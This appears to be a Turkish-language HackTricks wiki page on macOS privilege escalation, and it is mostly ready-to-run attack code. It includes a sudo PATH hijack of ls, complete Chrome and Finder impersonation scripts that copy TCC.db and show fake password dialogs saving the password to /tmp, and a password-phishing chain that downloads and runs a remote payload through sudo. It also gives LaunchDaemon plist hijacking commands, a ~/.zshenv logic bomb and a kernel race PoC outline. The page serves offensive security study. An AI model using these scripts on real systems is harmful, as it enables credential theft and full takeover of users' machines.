# macOS Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

## TCC Yetki Yükseltme

TCC yetki yükseltme arıyorsanız şuraya gidin:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Linux/Unix'i etkileyen **yetki yükseltme** yöntemlerinin **çoğunun** MacOS makinelerini de etkileyeceğini unutmayın. Bu nedenle şuraya bakın:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Kullanıcı Etkileşimi

### Sudo Hijacking

Orijinal [Sudo Hijacking tekniğini Linux Privilege Escalation gönderisinde](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) bulabilirsiniz.

Ancak macOS, kullanıcı **`sudo`** çalıştırdığında kullanıcının **`PATH`** değerini **korur**. Bu da bu saldırıyı gerçekleştirmenin başka bir yolunun, kurban **sudo çalıştırırken** çalıştıracağı diğer **binary'leri hijack etmek** olacağı anlamına gelir:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Bir terminal kullanan kullanıcının **Homebrew installed** olma olasılığının oldukça yüksek olduğunu unutmayın. Bu nedenle **`/opt/homebrew/bin`** içindeki binary'leri hijack etmek mümkündür.

### Dock Impersonation

Bazı **social engineering** yöntemlerini kullanarak, örneğin Dock içinde **Google Chrome'u impersonate** edebilir ve aslında kendi script'inizi çalıştırabilirsiniz:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Bazı öneriler:

- Dock'ta Chrome olup olmadığını kontrol edin; varsa bu girdiyi **remove** edin ve **fake** **Chrome entry**'yi Dock array'inde **aynı position**'a **add** edin.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Bazı öneriler:

- **Finder'ı Dock'tan kaldıramazsınız**, bu nedenle onu Dock'a ekleyecekseniz sahte Finder'ı gerçek Finder'ın hemen yanına yerleştirebilirsiniz. Bunun için **sahte Finder girdisini Dock array'inin başına eklemeniz** gerekir.
- Başka bir seçenek, onu Dock'a yerleştirmemek ve yalnızca açmaktır; "Finder'ın Finder'ı kontrol etmek istemesi" pek de garip değildir.
- Korkunç bir kutuyla parola sormadan **root'a yükselmenin** başka bir seçeneği, Finder'ın ayrıcalıklı bir eylem gerçekleştirmek için gerçekten parola sormasını sağlamaktır:
- Finder'dan **`/etc/pam.d`** dizinine yeni bir **`sudo`** dosyası kopyalamasını isteyin (Parolayı isteyen istem, "Finder sudo'yu kopyalamak istiyor" ifadesini gösterecektir)
- Finder'dan yeni bir **Authorization Plugin** kopyalamasını isteyin (Dosya adını kontrol ederek parola isteyen istemin "Finder Finder.bundle'u kopyalamak istiyor" ifadesini göstermesini sağlayabilirsiniz)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware, **sudo yetkisine sahip bir parolayı ele geçirmek** ve bu parolayı programatik olarak yeniden kullanmak için sıklıkla kullanıcı etkileşimini kötüye kullanır. Yaygın bir akış:

1. `whoami` ile oturum açmış kullanıcıyı belirleyin.
2. `dscl . -authonly "$user" "$pw"` başarılı sonuç döndürene kadar **parola istemlerini döngüye alın**.
3. Kimlik bilgisini (ör. `/tmp/.pass`) önbelleğe alın ve ayrıcalıklı işlemleri `sudo -S` (stdin üzerinden parola) ile gerçekleştirin.

Örnek minimal zincir:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Çalınan parola daha sonra **`xattr -c` ile Gatekeeper quarantine'i temizlemek**, LaunchDaemons veya diğer privileged dosyaları kopyalamak ve ek aşamaları etkileşimsiz şekilde çalıştırmak için yeniden kullanılabilir.<sup>[[1]](#references)</sup>

## Daha yeni macOS'e özgü vektörler (2023–2025)

### Kullanımdan kaldırılmış `AuthorizationExecuteWithPrivileges` hâlâ kullanılabilir

`AuthorizationExecuteWithPrivileges`, 10.7'de deprecated edildi ancak **Sonoma/Sequoia'da hâlâ çalışır**. Birçok commercial updater, güvenilmeyen bir path ile `/usr/libexec/security_authtrampoline` çağırır. Hedef binary kullanıcı tarafından yazılabiliyorsa bir trojan yerleştirip meşru prompt'u kullanabilirsiniz:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Yukarıdaki **masquerading tricks** ile birleştirerek inandırıcı bir parola iletişim kutusu sunun.


### Privileged helper / XPC triage

Modern üçüncü taraf macOS privesc'lerinin çoğu aynı kalıbı izler: bir **root LaunchDaemon**, **`/Library/PrivilegedHelperTools`** konumundan bir **Mach/XPC service** sunar; ardından helper ya **client'ı doğrulamaz**, **çok geç doğrular** (PID race) veya **user-controlled bir path/script** kullanan bir **root method** açığa çıkarır. Bu, VPN client'ları, game launcher'lar ve updater'lardaki birçok güncel helper bug'ının arkasındaki bug class'ıdır.<sup>[[2]](#references)</sup>

Hızlı triage checklist:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Özellikle şu özelliklere sahip helper'lara dikkat edin:

- job `launchd` içinde yüklü kaldığı için **uninstall işleminden sonra** istekleri kabul etmeye devam edenler
- **`/Applications/...`** veya non-root kullanıcılar tarafından yazılabilir diğer path'lerden script çalıştıran ya da configuration okuyanlar
- race edilebilecek **PID-based** veya **bundle-id-only** peer validation kullananlar

Helper authorization bug'ları hakkında daha fazla bilgi için [bu sayfaya](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md) bakın.

### PackageKit script environment inheritance (CVE-2024-27822)

Apple bunu **Sonoma 14.5**, **Ventura 13.6.7** ve **Monterey 12.7.5** sürümlerinde düzeltene kadar, **`Installer.app`** / **`PackageKit.framework`** üzerinden kullanıcı tarafından başlatılan install işlemleri, **PKG script'lerini mevcut kullanıcının environment'ı içinde root olarak** çalıştırabiliyordu. Bu, **`#!/bin/zsh`** kullanan bir package'ın saldırganın **`~/.zshenv`** dosyasını yükleyip, kurban package'ı yüklediğinde bunu **root** olarak çalıştırabileceği anlamına geliyordu.<sup>[[3]](#references)</sup>

Bu durum özellikle bir **logic bomb** olarak ilgi çekicidir: Kullanıcı hesabında bir foothold ve yazılabilir bir shell startup file'a sahip olmanız yeterlidir; ardından kullanıcı tarafından çalıştırılacak herhangi bir vulnerable **zsh-based** installer'ı beklersiniz. Bu durum genellikle **MDM/Munki** deployment'ları için geçerli değildir; çünkü bunlar root kullanıcının environment'ı içinde çalışır.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Installer'a özgü kötüye kullanımları daha ayrıntılı incelemek istiyorsanız [bu sayfaya](macos-files-folders-and-binaries/macos-installers-abuse.md) da göz atın.

### LaunchDaemon plist hijacking (CVE-2025-24085 pattern)

Bir LaunchDaemon plist'i veya `ProgramArguments` hedefi **kullanıcı tarafından yazılabilir** durumdaysa, onu değiştirip ardından launchd'yi yeniden yüklemeye zorlayarak yetki yükseltebilirsiniz:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Bu, yazılabilir bir plist'in root olarak attacker code çalıştırmak için abuse edildiği **CVE-2025-24085** için yayımlanan exploit pattern'i yansıtır.

### XNU SMR credential race (CVE-2025-24118)

`kauth_cred_proc_update` içindeki bir **race**, local attacker'ın thread'ler arasında `setgid()`/`getgid()` loop'ları çalıştırarak, torn `memcpy` gerçekleşene kadar read-only credential pointer'ını (`proc_ro.p_ucred`) corrupt etmesine olanak tanır. Başarılı bir corruption, **uid 0** ve kernel memory access sağlar. Minimal PoC yapısı:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Heap grooming ile birlikte kullanarak kontrollü veriyi pointer'ın yeniden okunduğu konuma yerleştirin. Güvenlik açığı bulunan build'lerde bu, SIP bypass gereksinimi olmadan güvenilir bir **local kernel privesc** sağlar.<sup>[[4]](#references)</sup>

### Migration Assistant üzerinden SIP bypass ("Migraine", CVE-2023-32369)

Zaten root erişiminiz varsa SIP yine de system konumlarına yazmayı engeller. **Migraine** bug'ı, Migration Assistant entitlement'ı olan `com.apple.rootless.install.heritable` değerini kötüye kullanarak SIP bypass'ı miras alan ve korunan yolların (ör. `/System/Library/LaunchDaemons`) üzerine yazan bir child process başlatır.<sup>[[5]](#references)</sup> Zincir:

1. Çalışan bir sistemde root erişimi elde edin.
2. Saldırgan tarafından kontrol edilen bir binary çalıştırmak için `systemmigrationd`'yi hazırlanmış state ile tetikleyin.
3. SIP tarafından korunan dosyalara patch uygulamak için miras alınan entitlement'ı kullanın; bu, reboot sonrasında bile kalıcılığını sürdürür.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Birden fazla Apple daemon'ı XPC üzerinden **NSPredicate** nesnelerini kabul eder ve yalnızca attacker-controlled olan `expressionType` alanını doğrular. Arbitrary selector'ları değerlendiren bir predicate oluşturarak **root/system XPC service'lerinde code execution** (ör. `coreduetd`, `contextstored`) elde edebilirsiniz. Bu durum initial app sandbox escape ile birleştirildiğinde, **user prompt'ları olmadan privilege escalation** sağlar. Predicate'leri deserialize eden ve sağlam bir visitor içermeyen XPC endpoint'lerini arayın.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass ve privilege escalation

**Herhangi bir user** (unprivileged user'lar bile) `-o noowners` ile bir Time Machine snapshot'ı oluşturup mount edebilir ve bu snapshot'taki **TÜM dosyalara erişebilir**; böylece live volume üzerindeki ownership kontrollerini bypass eder. Gereken tek privilege, kullanılan application'ın (ör. `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) yetkisine sahip olmasıdır.

Komutlar ve tam açıklama TCC bypasses sayfasındadır:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

Bu, privilege escalation için faydalı olabilir:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)

{{#include ../../banners/hacktricks-training.md}}
